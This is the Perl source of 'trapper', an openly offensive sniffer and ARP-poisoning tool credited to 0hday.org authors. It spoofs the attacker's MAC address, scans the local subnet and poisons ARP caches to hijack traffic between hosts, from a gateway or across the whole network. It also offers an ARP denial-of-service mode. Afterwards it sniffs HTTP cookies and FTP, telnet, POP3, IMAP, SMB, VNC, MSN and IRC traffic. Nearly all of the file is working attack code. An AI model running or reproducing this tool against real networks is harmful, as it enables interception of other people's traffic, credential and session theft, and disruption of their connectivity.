#!/usr/bin/perl 
#
# This is propietary code of 0hday.org for enciclopedia
# pentestica, this is is released under beerware license
# don't remove this headers and send comments to flames@0hday.org
# (YES it does exist, ping emails will not be answered)
#
# Jorge A. Trujillo <crypkey@0hday.org>
# F. Javier Carlos Rivera <nediam@nediam.com.mx>
# Enrique A. Sanchez Montellano <nahual@0hday.org>
#
#
# Thanks to: sdc, nitr0us, trew for some of the code implemented in trapper.
#
#

# Enable warning messages
BEGIN { $SIG{'__WARN__'} = sub { warn $_[0] if $DOWARN } }
# Use the required modules
use lib './modules';
use CPAN;
use Getopt::Std;
use Net::IP qw(:PROC);
use Config::Simple;
use Trapper_sniffing;
use Trapper_APR;

# Check if we are r00t
if (($> != 0)) { die ("\nError: You need to be root in order to run trapper =).\n\n"); }
getopts("i:m:v:f:l:p:t:w:d",\%options);

if (!($options{i}) || !($options{m})) { usage(); }
$| = 1; #autoflush
# Global stuff && getting all information.
$dev = trim($options{i}); 
$mode = trim($options{m});
$mmac = trim($options{f});
$promisc = trim($options{p});
$packetlenght = trim($options{l});
$timearp = trim($options{t});
$pcap_offline = trim($options{w});
$getip = `/sbin/ifconfig $dev | grep inet `;
$getmac = `/sbin/ifconfig $dev | grep HWaddr`;
chomp($getmask = `/sbin/ifconfig $dev | grep Mas`);
if (!$getmac) { $getmac = `/sbin/ifconfig $dev | grep direcciónHW`; }
if (!$getmask) { chomp($getmask = `/sbin/ifconfig $dev | grep Más`); }
@getip = split(/:/, $getip);
@getmas = split(/:/, $getmask);
@ip = split(" ", $getip[1]);
$ip_attacker = $ip[0];
$mask = trim($getmas[3]);
$getmac =~ /(([0-9A-F]{2}:){5}[0-9A-F]{2})/i;
$mac_attacker = trim($1);
chomp($gateway = `route -n | grep UG`);
$gateway =~ /0.0.0.0(.+)0.0.0.0/;
$gateway = trim($1);
	
# Some checking
if (!defined($mmac)) {		
	if (!ip_is_ipv4($ip_attacker) && $dev ne "lo" && !$pcap_offline) { die("\nError: Can't detect your local ip || check if '$dev' exists or is up\n\n"); }
	if ((ip_is_ipv6($ip_attacker) || !$ip_attacker) && $dev ne "lo" && !$pcap_offline) { die("\nError: Can't detect your local ip || check if '$dev' exists or is up\n\n"); }
	if (!$mac_attacker && $dev ne "lo" && !$pcap_offline) { die("\nError: Can't detect your mac address, bug... contact us.\n\n"); }
	$datalen = ($packetlenght) ? $packetlenght : 4096;
	#usage() if $promisc;
	if (defined($options{d})) {
		$debug = "1";
		print "\n\n";
		for $mod (qw(Proc::Simple Getopt::Std Time::HiRes Net::Pcap NetPacket::IP NetPacket::TCP NetPacket::Ethernet Net::IP Net::ARP Net::RawIP Net::Ping Net::Frame Net::Frame::Layer Net::Frame::Layer::ARP Net::Frame::Simple Net::Frame::Dump Net::Frame::Dump::Online2 DBI DBD::SQLite)) {
			$modchk = CPAN::Shell->expandany($mod);
			$instmod = $modchk->inst_version;
			$cpanver = $modchk->cpan_version;
			print "[Debug] => $mod installed version: $instmod && lastest $mod version: $cpanver\n";
		}
		print "[Debug] => Using device: $dev\n";
		print "[Debug] => IP attacker: $ip_attacker\n";
		print "[Debug] => MAC attacker: $mac_attacker\n";
		print "[Debug] => Gateway IP: $gateway\n";
		print "[Debug] => Packet Lenght: $datalen\n";
		print "[Debug] => Promisc Mode: $promisc\n";
		print "[Debug] => Debug: $debug\n";
		print "[Debug] => Time between ARP packets: $timearp\n";
	}
}	

# Start trapper header
trapper_header();
if ($mmac) { 
	$fakemac = trim($options{f});
	if ($fakemac eq "random") {
		@partmac = split(":", $mac_attacker);
		$randommac = random_mac();
		$randommac = trim($randommac);
		$fakemac = "$partmac[0]:$partmac[1]:$partmac[2]:$randommac"; 
	}
	$chkmac = $fakemac;
	$chkmac =~ s/://g;
	die("\nError: MAC Adress must have 12 chars: $fakemac\n\n") if length($chkmac) > 12;
	header_mac($fakemac, $mac_attacker);  
}

if (defined($options{v})) {
	$dumpmsn = ($options{v} =~ /(msn)/s) ? "on" : "off";
	$dumpcook = ($options{v} =~ /(cookie)/s) ? "on" : "off";
	$dumpirc = ($options{v} =~ /(irc)/s) ? "on" : "off";
}

read_configuration();
if($mode eq 'sniff') {
	$filter_str = sniff();
	print "\n[*] Sniffing using Dev :$dev:\n";
	print "[*] Filter :$filter_str:\n\n";
	`rm -rf *.pcap`;
	`rm -rf *.storable`;
	start_sniffer($dev, $filter_str, $dumpirc, $dumpmsn, $dumpcook, $mac_attacker, $datalen, $promisc, $ip_attacker, $debug, '');
}
elsif ($mode eq 'apr') {
	if ($dev eq "lo") { die("\nError: Can't poison with $dev interface\n\n"); }
	$scantag = "";
	print "[*] MODE SELECTED: ARP POISON ROUTING\n";
	print "[*] Select type of scan: \n";
	print "[*] 1) Automatic range detection\n";
	print "[*] 2) Specify manual range (ex. 192.168.1.0 - 192.168.4.254 )\n";
	print "[*] 3) Exit\n\n";
	do {
		($op,$opagain) = "";
		print "[+] Option: ";
		chomp($op = <STDIN>);
		if (trim($op) == 1) {
			print "[*] Detecting your network.....\n";
			sleep(1);
			# sexy detection
			$start = ip2long($ip_attacker) & ip2long($mask);
			$end = long2ip($start + ~ip2long($mask)-1);
			$start = long2ip($start);
		}
		elsif (trim($op) == 2) {
			print "\n[*] Specify Range: ";
			chomp($oprange = <STDIN>);
			@range = split(/\s*-\s*/, trim($oprange));
			chomp($range[0]);
			chomp($range[1]);
			$start = $range[0];
			$end = $range[1];
		}
		elsif (trim($op) == 3) {
			exit;
		}
		$scantag = '1' if ($start && $end);
		if (!$scantag && $op < 4 && $op > 0) {
			print "[*] We could not automatically/manually detect your network\n";
			print "[*] Make sure you are using a private IP\n\n";
		}
		if ($scantag) {
			@victims = scan_hosts($dev, $ip_attacker, $mac_attacker, $ip_target, $start, $end);
			$totalvic = @victims;
			$opagain = "";
			# We only support ipv4 atm ;)
			if (!ip_is_ipv4($start) || !ip_is_ipv4($end)) { die("\nError: Not IPv4 Addresses..bye\n"); }
			print "[*] Want to scan again? [Y/N]: ";
			chomp($opagain = <STDIN>);
			if (trim($opagain) =~ /y/i) { $scantag = ""; }
		}
	} while (!$scantag || $op > 4 || !$op);
	print "[*] Select Option:\n";
	print "[*] 1) One-to-One: Hijack the traffic only between two particular hosts\n";
	print "[*] 2) One-to-All: Hijack the network faking a single host (The default gateway is a good option)\n";
	print "[*] 3) Hijack the entire network\n";
	print "[*] 4) Distributed ARP / DoS ARP\n";
	print "[*] 5) Exit\n";
	do {
		print "[+] Type of attack: ";
		chomp($type_attack = <STDIN>);
	}
	while ($type_attack > 5 || !$type_attack);
	if (trim($type_attack) == 1) {
		if ($totalvic < 2) { die("\nError: No more than 1 user on this network\n"); }
		print "[*] Specify first IP: ";
		chomp($ip_target1 = <STDIN>);
		$ip_target1 = trim($ip_target1);
		`ping -c 1 $ip_target1`;
		$aux = `arp -an | grep '($ip_target1)'`;
		$aux =~ /(([0-9A-F]{2}:){5}[0-9A-F]{2})/i;
		$mac_target1 = trim($1);
		print "[*] Target MAC 1: " . $mac_target1 . "\n";
		print "[*] Specify second IP: ";
		chomp($ip_target2 = <STDIN>);
		$ip_target2 = trim($ip_target2);
		`ping -c 1 $ip_target2`;
		$aux = `arp -an | grep '($ip_target2)'`;
		$aux =~ /(([0-9A-F]{2}:){5}[0-9A-F]{2})/i;
		$mac_target2 = trim($1);
		sleep(2);
		print "[*] Target MAC 2: " . $mac_target2 . "\n";
		if (!$mac_target1 || !$mac_target2 || !$ip_target1 || !$ip_target2 || $mac_target1 eq $mac_target2) { die("Error: Unable To Get Mac Addresses, make sure the target exists\n"); }
		infect_hosts($dev, $mac_attacker, $ip_target1, $mac_target1, $ip_target2, $mac_target2, "1", $timearp, '');
	}
	elsif (trim($type_attack) == 2 || trim($type_attack) == 3) {
		if (trim($type_attack) eq "2") {
			if ($totalvic < 2) { die("\nError: No more than 1 user on this network\n"); }
			if ($gateway) {
				print "[*] Gateway detected: $gateway\n";
				print "[*] Do you want to use this IP [y/n]: ";
				chomp($gateop = <STDIN>);
				if ($gateop =~ /n/si) {
					print "[*] Specify target IP: ";
					chomp($ip_target = <STDIN>);
				}
				else {
					$ip_target = $gateway;
				}
			}
			print "[*] Using: $ip_target\n";
			`ping -c 1 $ip_target`;
			$aux = `arp -an | grep '($ip_target)'`;
			$aux =~ /(([0-9A-F]{2}:){5}[0-9A-F]{2})/i;
			$mac_target = trim($1);
			print "[*] Target MAC: " . $mac_target . "\n";
			if (!$mac_target || !$ip_target) { die("Error: Unable To Get Mac Address, make sure the target exists\n"); }
			infect_hosts($dev, $mac_attacker, $ip_target, $mac_target, '', '', "2", $timearp, @victims);
		}
		elsif (trim($type_attack) eq "3") {
			if ($totalvic < 2) { die("\nError: No more than 1 user on this network\n"); }
			infect_hosts($dev, $mac_attacker, '', '', ,'', '', "3", $timearp, @victims);
		}
	}
	elsif (trim($type_attack) eq '4') {
		if ($totalvic < 2) { die("\nError: No more than 1 user on this network\n"); }
		print "[*] Who are you helping? / Who do you wanna DoS? \n";
		print "[*] Please specify the IP you wanna help/attack: \n";
		chomp($arpds = <STDIN>);
		`ping -c 1 $arpds`;
		sleep(2);
		$aux = `arp -an | grep '($arpds)'`;
		$aux =~ /(([0-9A-F]{2}:){5}[0-9A-F]{2})/i;
		$mac_ds = trim($1);
		print "[*] Target MAC: $mac_ds\n";
		print "[*] Using One-to-All type of attack...\n";
		print "[*] Using gateway: $gateway for poisoning...\n";
		$ip_target = $gateway;
		`ping -c 1 $arpds`;
		$aux = `arp -an | grep '($ip_target)'`;
		$aux =~ /(([0-9A-F]{2}:){5}[0-9A-F]{2})/i;
		$mac_target = trim($1);
		if (!$mac_target || !$ip_target) { die("Error: Unable To Get Mac Address, make the target sure exists\n"); }
		infect_hosts($dev, $mac_ds, $ip_target, $mac_target, ,'', '', "2", $timearp, @victims);
	}
	elsif (trim($type_attack) eq '5') {
		print "[*] Dying... Bye\n\n";
		exit;
	}
	# after infect the network using APR let's now start sniffing  
	$filter_str = sniff();
	`rm -rf *.pcap`;
	`rm -rf *.storable`;
	print "\n[*] Sniffing using Dev :" . $dev . ":\n";
	print "[*] Filter :" . $filter_str . ":\n\n";
	start_sniffer($dev, $filter_str, $dumpirc, $dumpmsn, $dumpcook, $mac_attacker, $datalen, $promisc, $ip_attacker, $debug, @victims);
}
else { die ("\nError: Option not supported | RTFM\n\n"); }


###################################### AUXILIARY FUNCTIONS ####################################
sub ip2long {
	($str) = @_;
	@a = split(/\./, $str);
	push(@a, (0, 0, 0));
	return $a[0] * 0x01000000 + $a[1] * 0x010000 + $a[2] * 0x0100 + $a[3];
}

sub long2ip{
	$long = shift(@_);
	($i,@octets,$retval);
	for($i = 3; $i >= 0; $i--) {
		$octets[$i] = ($long & 0xFF);
		$long >>= 8;
	} 
	$octets[3]-- if ($octets[3] > 254);
	$octets[3]++ if ($octets[3] eq 0);
	$retval = join('.', @octets);
	return $retval;
}

sub random_mac() {
	$i = 0;
	while ($i < 4) {
		$rand = rand(255);
		if ($rand < 16) {
			$rand += 16;
			$mhex = sprintf("%X", $rand);
		}
		else {
			$mhex = sprintf("%X", $rand);
		}
		$rndm[$i] = $mhex;
		$i++;
	}
	$final = "$rndm[1]:$rndm[2]:$rndm[3]";
	return $final;
}

sub read_configuration {
	
	# Load Configuration
	$cfg = new Config::Simple('trapper.conf') or die Config::Simple->error();	
	$ftp = $cfg->param('ports.ftp');
	$telnet = $cfg->param('ports.telnet');
	$smtp = $cfg->param('ports.smtp');
	$imap = $cfg->param('ports.imap');
	$http = $cfg->param('ports.http');
	$pop3 = $cfg->param('ports.pop3');
	$smb = $cfg->param('ports.smb');
	$msn = $cfg->param('ports.msn');
	$irc = $cfg->param('ports.irc');
	$sip = $cfg->param('ports.sip');
	$vnc = $cfg->param('ports.vnc');
	$teamspeak = $cfg->param('ports.teamspeak');
	@httpports = split(",", $http);
	
}

sub sniff {
	if (defined($fakemac)) { print "[*] Using fake mac addr: $rndmac$fake_mac\n"; }
	print "[*] Supported protocols: \n\n";
	print "0. ALL\n";
	print "1. HTTP (Cookie supported)\n";
	print "2. FTP\n";
	print "3. TELNET\n";
	print "4. POP3\n";
	print "5. IMAP\n";
	print "6. SMTP\n";
	print "7. MSN\n";
	print "8. IRC (Convos supported)\n";
	print "9. SMB\n";
	print "10. VNC\n";
	print "11. TeamSpeak\n";
	print "12. SIP\n\n";
	print "Select option(s) [default: 0]: ";
	chomp($option = <STDIN>);
	@ports = split(" ", $option);
	if($ports[0] == 0 || !$option || $option > 12) { 
		$filter_str = "port $ftp or port $telnet or port $smtp or port $httpports[0] or port " .trim($httpports[1]). " or port " .trim($httpports[2]). " or port " .trim($httpports[3]). " or port $imap or port $pop3 or port $msn or port $irc or port $smb or port $sip or port $vnc or port $teamspeak"; 
	}
	else {
		$httports = "$httpports[0] or port " .trim($httpports[1]). " or port " .trim($httpports[2]). " or port " .trim($httpports[3]). "";
		@ports_number = ("", "$httports", "$ftp", "$telnet", "$pop3", "$imap", "$smtp", "$msn", "$irc", "$smb", "$vnc", "$teamspeak", "$sip");
		foreach(@ports) { 
			if($_ > 0 && $_ < 13) { $filter_str .= 'port ' . $ports_number[$_] . ' or '; }
		}
		$filter_str = substr($filter_str, 0, length($filter_str) - 3);
		$filter_str = trim($filter_str);
	}
	return $filter_str;
}

sub usage() {
	print "\n\t\t\t--trapper ver. 0.5.5--\n";
	print "\t     --Sniffer and ARP Poisoning Routing program--\n\n";
	print "Usage: ./trapper.pl -i <interface> -m <mode> [Options]\n";
	print "Mode: sniff || apr\n";
	print "Options: \n";
	print "	-v <verbose_options> - Verbose on msn, cookie or irc protocols\n";
	print "	-f <fake_mac> - Fake mac to use or put 'random' to generate one\n";
	print "	-d - Enable debug mode ( for bug reports )\n";
	print "	-l <lenght> - Lenght of the packet\n";
	print "	-p <option> - '0' to disable promisc mode ( enabled by default )\n";
	print "	-t <time> - Time between every ARP packet ( default 2 seconds )\n\n";
	print "Example: trapper -i eth0 -m apr -f 00:02:5C:17:2B:FA -l 2048 -t 1\n";
	print "For more information on the usage please read the README file\n\n";
	exit;
}

sub trapper_header() {
	print "\n-------------------------------------------------------------------\n";
	print "\t\t\ttrapper ver. 0.5.7\n";
	print "\t\tAuthors: crypkey, nediam, nahual\n\n";
}

sub header_mac($) {
	($fake_mac, $rmac) = @_;
	print "-------------------------------------------------------------------\n";
	if (defined($options{d})) {
		print "[Debug] => Fake Mac set: $fakemac\n";		
	}
	print "\n[*] Fake your mac address, please follow the steps...\n";
	print "[*] Number of linux distro ( 'L' for list): ";
	chomp($response = <STDIN>);
	if ($response =~ /L/i) {
		print "\n1) Ubuntu & Related\n";
		print "2) Debian/Slackware/Mandriva/Fedora/Other\n\n";
		print "[+] Choose a number: ";
		chomp($response = <STDIN>); 
	}
	if($response eq 1) {
		print "[*] Right click on network manager icon and deselect networking\n";
		print "[*] You ready to continue? (Y/N) [Y]: ";
		chomp($netw = <STDIN>);
		if($netw=~/n/i) {
			die("[+] Leaving trapper...\n\n");
		}
		fake_mac($fake_mac, $response, $rmac);  
	}
	elsif($response eq 2) {
		print "[*] Shutting down your network....\t";
		`/sbin/ifdown $dev`;
		print "[OK]\n";
		fake_mac($fake_mac, $response, $rmac);
		print "[*] Waiting your internet connection to start....\t";
		`/sbin/ifup $dev`;
		sleep(6);
		print "[OK]\n"; 
	}
	else { die("\nError:  not supported yet. Please fake your MAC address manually ;)\n"); }
}

sub fake_mac($) {
	($fake, $distro, $real_mac) = @_;
	print "[*] Faking your mac addr to $fake, please wait...\n";
	if ($dev =~ /ath/) {
		print "[*] Destroying device => $dev\n";
		$ifc = `modprobe ath_pci autocreate=none`;
		$ifc2 = `wlanconfig $dev destroy`;
		$ifc3 = `ip link set dev wifi0 down`;
		$ifc4 = `ip link set addr $fake dev wifi0`;
		$ifc5 = `ip link set dev wifi0 up`;
		$ifc6 = `wlanconfig ath create wlandev wifi0 wlanmode sta`;
		sleep(8);
		if ($fake ne $real_mac) {
			chomp($newdev = `ifconfig | grep ath`);
			$newdev = trim($newdev);
			@definedev = split(" ", $newdev);
			$devnmb = trim($definedev[0]);
			$dev = $devnmb;  
		}
		print "[*] New device created => $dev\n"; 
	}
	else {
		$ifc2 = `ifconfig $dev hw ether $fake down`; 
	}
	print "[*] Done..\n";
	if ($distro eq 1) {
		print "[*] Right click on network manager icon and select networking.\n";
		print "[*] Wait until you have internet again.\n";
		print "[*] You ready to continue? (Y/N) [Y]: ";
		chomp($netw = <STDIN>);
		if($netw =~ /n/i){
			die("\n\n[+] Leaving trapper..\n"); 
		}
	}
	return;
}
